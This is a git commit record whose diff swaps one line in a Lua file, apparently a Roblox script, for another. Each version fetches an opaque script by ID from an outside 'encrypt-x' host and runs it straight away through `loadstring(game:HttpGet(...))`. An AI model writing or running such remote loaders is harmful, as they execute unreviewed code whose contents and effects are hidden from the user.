344d086526bd97ae41a1faffdbc5cde05e3c197d
cnPthPiGon <samurchris8@gmail.com>
2026-04-30 12:56:44 +0200

    Update Ggrrrrraaaaaaaaaa____N?B.lua

--- Ggrrrrraaaaaaaaaa____N?B.lua
+++ Ggrrrrraaaaaaaaaa____N?B.lua
@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=6796866359508"))("6796866359508")
+loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=0715216172572"))("0715216172572")
